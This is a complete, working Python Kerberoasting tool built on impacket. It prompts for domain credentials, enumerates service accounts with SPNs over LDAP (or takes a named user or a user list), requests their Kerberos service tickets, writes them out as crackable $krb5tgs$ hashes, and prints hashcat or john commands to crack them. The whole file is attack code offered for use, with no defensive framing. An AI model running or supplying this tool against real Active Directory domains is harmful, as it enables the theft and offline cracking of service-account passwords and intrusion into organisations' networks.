#!/usr/bin/env python3
import os
import sys
import re
import platform
import logging
import traceback
from datetime import datetime, timezone
from binascii import hexlify, unhexlify

from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.smbconnection import SMBConnection, SessionError
from pyasn1.codec.der import decoder

from ldap3 import Server, Connection, ALL, NTLM
from ldap3.core.exceptions import LDAPBindError
from colorama import Fore, Style, init
import signal

def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)

init(autoreset=True)
logging.getLogger().setLevel(logging.ERROR)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║           Kerberoasting Attack            ║
    ║     Extracts Service Account TGS Hashes   ║
    ╚═══════════════════════════════════════════╝
    """)


def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def check_ip_reachable(dc_ip):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(server)
        conn.open()
        conn.unbind()
        return True
    except Exception:
        return False


def check_credentials_and_domain(dc_ip, domain, username, password):
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn    = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        conn.search(
            search_base=base_dn,
            search_filter='(objectClass=domain)',
            search_scope='SUBTREE',
            attributes=['dc']
        )
        result = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError:
        return "invalid_credentials"
    except Exception:
        return False


def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def resolve_file_path(user_input):
    user_input = user_input.lstrip('/').lstrip('\\')
    return os.path.normpath(os.path.join(os.getcwd(), user_input))


def validate_userlist_file(file_path):
    full_path = resolve_file_path(file_path)
    if not os.path.exists(full_path):
        print(Fore.RED + f"[!] File not found: {full_path}" + Style.RESET_ALL)
        return None
    if os.path.getsize(full_path) == 0:
        print(Fore.RED + f"[!] File is empty: {full_path}" + Style.RESET_ALL)
        return None
    if not os.access(full_path, os.R_OK):
        print(Fore.RED + f"[!] Cannot read file: {full_path}" + Style.RESET_ALL)
        return None
    with open(full_path, 'r') as f:
        users = [line.strip() for line in f if line.strip()]
    if not users:
        print(Fore.RED + f"[!] No valid users in: {full_path}" + Style.RESET_ALL)
        return None
    print(Fore.GREEN + f"[+] Found {len(users)} users in: {full_path}" + Style.RESET_ALL)
    return users


def resolve_output_file(user_input):
    if not user_input:
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        return os.path.join(os.getcwd(), f"kerberoast-hashes-{timestamp}.txt")
    full_path = resolve_file_path(user_input)
    directory = os.path.dirname(full_path)
    if directory and not os.path.exists(directory):
        try:
            os.makedirs(directory, exist_ok=True)
            print(Fore.YELLOW + f"[*] Created directory: {directory}" + Style.RESET_ALL)
        except PermissionError:
            print(Fore.RED + f"[!] Permission denied: {directory}" + Style.RESET_ALL)
            fallback = os.path.join(os.getcwd(), os.path.basename(user_input))
            print(Fore.YELLOW + f"[*] Saving to: {fallback}" + Style.RESET_ALL)
            return fallback
        except Exception as e:
            print(Fore.RED + f"[!] Cannot create directory: {e}" + Style.RESET_ALL)
            sys.exit(1)
    return full_path


def get_unix_time(t):
    t -= 116444736000000000
    t /= 10000000
    return t


def format_tgs_hash(decoded_tgs, username, domain):
    enc_type = decoded_tgs['ticket']['enc-part']['etype']
    cipher   = decoded_tgs['ticket']['enc-part']['cipher']

    if enc_type == constants.EncryptionTypes.rc4_hmac.value:
        return '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
            constants.EncryptionTypes.rc4_hmac.value,
            username, domain, username,
            hexlify(cipher[:16].asOctets()).decode(),
            hexlify(cipher[16:].asOctets()).decode()
        )
    elif enc_type == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
        return '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
            constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
            username, domain, username,
            hexlify(cipher[-12:].asOctets()).decode(),
            hexlify(cipher[:-12:].asOctets()).decode()
        )
    elif enc_type == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
        return '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
            constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
            username, domain, username,
            hexlify(cipher[-12:].asOctets()).decode(),
            hexlify(cipher[:-12:].asOctets()).decode()
        )
    elif enc_type == constants.EncryptionTypes.des_cbc_md5.value:
        return '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
            constants.EncryptionTypes.des_cbc_md5.value,
            username, domain, username,
            hexlify(cipher[:16].asOctets()).decode(),
            hexlify(cipher[16:].asOctets()).decode()
        )
    return None


def get_tgt(username, password, domain, dc_ip):
    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    try:
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            user_principal, '', domain,
            compute_lmhash(password),
            compute_nthash(password),
            None, kdcHost=dc_ip
        )
    except Exception:
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            user_principal, password, domain,
            unhexlify(''), unhexlify(''),
            None, kdcHost=dc_ip
        )
    return {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}


def get_spn_users(dc_ip, domain, username, password, target_user=None):
    base_dn       = ','.join([f"dc={p}" for p in domain.split('.')])
    search_filter = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*))"

    if target_user:
        search_filter = f"(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(sAMAccountName={target_user}))"

    try:
        ldap_conn = ldap.LDAPConnection(f'ldap://{dc_ip}', base_dn, dc_ip)
        ldap_conn.login(username, password, domain, '', '')
    except Exception as e:
        if 'strongerAuthRequired' in str(e):
            try:
                ldap_conn = ldap.LDAPConnection(f'ldaps://{dc_ip}', base_dn, dc_ip)
                ldap_conn.login(username, password, domain, '', '')
            except Exception as e2:
                print(Fore.RED + f"[-] LDAP connection failed: {e2}" + Style.RESET_ALL)
                return []
        else:
            print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)
            return []

    paged_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)

    try:
        resp = ldap_conn.search(
            searchFilter=search_filter,
            attributes=['servicePrincipalName', 'sAMAccountName', 'pwdLastSet',
                        'memberOf', 'userAccountControl', 'lastLogon'],
            searchControls=[paged_control]
        )
    except Exception as e:
        print(Fore.RED + f"[-] LDAP search failed: {e}" + Style.RESET_ALL)
        return []

    accounts = []
    for item in resp:
        if not isinstance(item, ldapasn1.SearchResultEntry):
            continue
        try:
            sam_name = ''
            spns     = []
            pwd_last = ''
            last_log = 'N/A'
            uac      = 0
            member   = ''
            deleg    = ''

            for attr in item['attributes']:
                attr_type = str(attr['type'])
                if attr_type == 'sAMAccountName':
                    sam_name = str(attr['vals'][0])
                elif attr_type == 'userAccountControl':
                    uac = int(str(attr['vals'][0]))
                    if uac & UF_TRUSTED_FOR_DELEGATION:
                        deleg = 'unconstrained'
                    elif uac & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                        deleg = 'constrained'
                elif attr_type == 'memberOf':
                    member = str(attr['vals'][0])
                elif attr_type == 'pwdLastSet':
                    val      = str(attr['vals'][0])
                    pwd_last = '<never>' if val == '0' else str(datetime.fromtimestamp(get_unix_time(int(val))))
                elif attr_type == 'lastLogon':
                    val      = str(attr['vals'][0])
                    last_log = '<never>' if val == '0' else str(datetime.fromtimestamp(get_unix_time(int(val))))
                elif attr_type == 'servicePrincipalName':
                    for spn in attr['vals']:
                        spns.append(spn.asOctets().decode('utf-8'))

            if sam_name and not (uac & UF_ACCOUNTDISABLE):
                for spn in spns:
                    accounts.append({
                        'username':   sam_name,
                        'spn':        spn,
                        'memberOf':   member,
                        'pwdLastSet': pwd_last,
                        'lastLogon':  last_log,
                        'delegation': deleg
                    })
        except Exception as e:
            print(Fore.YELLOW + f"[!] Error processing entry: {e}" + Style.RESET_ALL)
            continue

    return accounts


def print_spn_table(accounts):
    if not accounts:
        return

    headers    = ["ServicePrincipalName", "Username", "MemberOf", "PasswordLastSet", "LastLogon", "Delegation"]
    col_widths = [len(h) for h in headers]

    for acc in accounts:
        row = [acc['spn'], acc['username'], acc['memberOf'], acc['pwdLastSet'], acc['lastLogon'], acc['delegation']]
        for i, val in enumerate(row):
            col_widths[i] = max(col_widths[i], len(val))

    fmt = ' '.join([f'{{:<{w}}}' for w in col_widths])

    print(Fore.CYAN + fmt.format(*headers) + Style.RESET_ALL)
    print(Fore.CYAN + '  '.join(['-' * w for w in col_widths]) + Style.RESET_ALL)
    for acc in accounts:
        row = [acc['spn'], acc['username'], acc['memberOf'], acc['pwdLastSet'], acc['lastLogon'], acc['delegation']]
        print(Fore.WHITE + fmt.format(*row) + Style.RESET_ALL)


def run_kerberoast(dc_ip, domain, username, password, output_file, fmt, target_user=None, userlist=None):
    print(Fore.YELLOW + "\n[*] Starting Kerberoasting attack..." + Style.RESET_ALL)

    hashes  = []
    success = 0
    failed  = 0

    try:
        print(Fore.YELLOW + "[*] Getting TGT..." + Style.RESET_ALL)
        TGT = get_tgt(username, password, domain, dc_ip)
        print(Fore.GREEN + "[+] TGT obtained successfully!" + Style.RESET_ALL)

        if userlist:
            print(Fore.YELLOW + f"[*] Mode: User list ({len(userlist)} users)" + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Requesting TGS for each user..." + Style.RESET_ALL)

            fd = open(output_file, 'w') if output_file else None

            for user in userlist:
                try:
                    principal_name            = Principal()
                    principal_name.type       = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principal_name.components = [user]

                    tgs, cipher, oldKey, sessionKey = getKerberosTGS(
                        principal_name, domain, dc_ip,
                        TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
                    )

                    decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                    hash_str    = format_tgs_hash(decoded_tgs, user, domain)

                    if hash_str:
                        success += 1
                        print(Fore.GREEN + f"[+] Got hash for: {user}" + Style.RESET_ALL)
                        hashes.append(hash_str)
                        if fd:
                            fd.write(hash_str + '\n')
                    else:
                        failed += 1
                        print(Fore.YELLOW + f"[!] Unsupported etype for: {user}" + Style.RESET_ALL)

                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    failed += 1
                    print(Fore.RED + f"[-] Failed for {user}: {e}" + Style.RESET_ALL)

            if fd:
                fd.close()

        else:
            print(Fore.YELLOW + "[*] Mode: LDAP enumeration" + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Enumerating SPN accounts from LDAP..." + Style.RESET_ALL)

            accounts = get_spn_users(dc_ip, domain, username, password, target_user)

            if not accounts:
                print(Fore.YELLOW + "\n[!] No SPN accounts found!" + Style.RESET_ALL)
                return

            print(Fore.GREEN + f"\n[+] Found {len(accounts)} SPN account(s)!\n" + Style.RESET_ALL)
            print_spn_table(accounts)
            print()

            users_spns = dict((acc['username'], acc['spn']) for acc in accounts)

            print(Fore.YELLOW + f"\n[*] Requesting TGS for {len(users_spns)} user(s)..." + Style.RESET_ALL)

            fd = open(output_file, 'w') if output_file else None

            for user, spn in users_spns.items():
                try:
                    down_level             = f"{domain}\\{user}"
                    principal_name         = Principal()
                    principal_name.type       = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                    principal_name.components = [down_level]

                    tgs, cipher, oldKey, sessionKey = getKerberosTGS(
                        principal_name, domain, dc_ip,
                        TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
                    )

                    decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                    hash_str    = format_tgs_hash(decoded_tgs, user, domain)

                    if hash_str:
                        success += 1
                        print(Fore.GREEN + f"[+] Got hash for: {user} ({spn})" + Style.RESET_ALL)
                        hashes.append(hash_str)
                        if fd:
                            fd.write(hash_str + '\n')
                    else:
                        failed += 1
                        print(Fore.YELLOW + f"[!] Unsupported etype for: {user}" + Style.RESET_ALL)

                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    failed += 1
                    print(Fore.RED + f"[-] Failed for {user}: {e}" + Style.RESET_ALL)

            if fd:
                fd.close()

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
        sys.exit(0)

    except Exception as e:
        print(Fore.RED + f"\n[-] Kerberoasting failed: {e}" + Style.RESET_ALL)
        print(Fore.RED + traceback.format_exc() + Style.RESET_ALL)
        sys.exit(1)

    if hashes:
        print(Fore.GREEN + f"\n[+] Successfully captured {success} hash(es)!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Hashes saved to: {output_file}" + Style.RESET_ALL)

        print(Fore.CYAN + "\n[*] Captured hashes:" + Style.RESET_ALL)
        for h in hashes:
            print(Fore.YELLOW + f"    {h}" + Style.RESET_ALL)

        if fmt == 'hashcat':
            print(Fore.CYAN + "\n[*] Crack with hashcat:" + Style.RESET_ALL)
            print(Fore.WHITE + f"    hashcat -m 13100 {output_file} wordlist.txt" + Style.RESET_ALL)
        else:
            print(Fore.CYAN + "\n[*] Crack with john:" + Style.RESET_ALL)
            print(Fore.WHITE + f"    john {output_file} --wordlist=wordlist.txt" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "\n[!] No hashes captured." + Style.RESET_ALL)

    print(Fore.CYAN + f"\n[*] Summary: {success} captured, {failed} failed" + Style.RESET_ALL)


if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.x.x"
    )

    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain   = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
                         validate_domain, "Invalid domain! Example: cs.org")
    username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
    password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)

    print(Fore.CYAN + "\n[?] Attack mode:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. LDAP enumeration (find all SPN accounts automatically)")
    print(Fore.WHITE + "    2. Single user")
    print(Fore.WHITE + "    3. User list")
    mode = get_input(
        Fore.CYAN + "[?] Choose mode          : " + Style.RESET_ALL,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1, 2 or 3"
    )

    target_user = None
    userlist    = None

    if mode == '2':
        target_user = get_input(Fore.CYAN + "[?] Enter target username: " + Style.RESET_ALL)
    elif mode == '3':
        while True:
            list_input = get_input(
                Fore.CYAN   + "[?] Enter userlist path  : " + Style.RESET_ALL +
                Fore.YELLOW + "(e.g. users.txt or /lists/users.txt) " + Style.RESET_ALL
            )
            userlist = validate_userlist_file(list_input)
            if userlist:
                break

    print(Fore.CYAN + "\n[?] Choose hash format:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. hashcat (default)")
    print(Fore.WHITE + "    2. john")
    hash_choice = get_input(
        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL +
        Fore.YELLOW + "(default: 1) " + Style.RESET_ALL,
        allow_empty=True
    )
    fmt = 'john' if hash_choice == '2' else 'hashcat'
    print(Fore.GREEN + f"[+] Using format: {fmt}" + Style.RESET_ALL)

    timestamp    = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    default_name = f"kerberoast-hashes-{timestamp}.txt"
    out_input    = get_input(
        Fore.CYAN   + f"[?] Output filename      : " + Style.RESET_ALL +
        Fore.YELLOW + f"(default: {default_name}) " + Style.RESET_ALL,
        allow_empty=True
    )
    output_file = resolve_output_file(out_input if out_input else "")

    run_kerberoast(dc_ip, domain, username, password, output_file, fmt,
                   target_user=target_user, userlist=userlist)
